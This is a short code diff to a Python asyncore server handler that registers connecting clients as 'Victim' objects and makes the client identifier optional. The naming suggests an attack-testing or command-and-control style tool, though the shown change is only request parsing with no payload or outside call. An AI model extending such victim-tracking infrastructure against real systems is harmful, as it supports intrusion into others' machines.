@@ -33,9 +33,13 @@ class CMDProtoHandler(asyncore.dispatcher_with_send):
 		request = self.recv(1024).strip()
 		if (request == ""): return
 		parts = request.split(" ")
+		if len(parts)==2:
+			ci = parts[1] #client identifier
+		else:
+			ci = ""
 		if parts[0]=="REG":
 			#new client received, grap local ip and return test id
-			vic = Victim(self.getpeername()[0], parts[1])
+			vic = Victim(self.getpeername()[0],ci)
 			vixexists=False
 			for victim in self.VICTIMS:
 				if victim.VIC_ID == vic.VIC_ID:
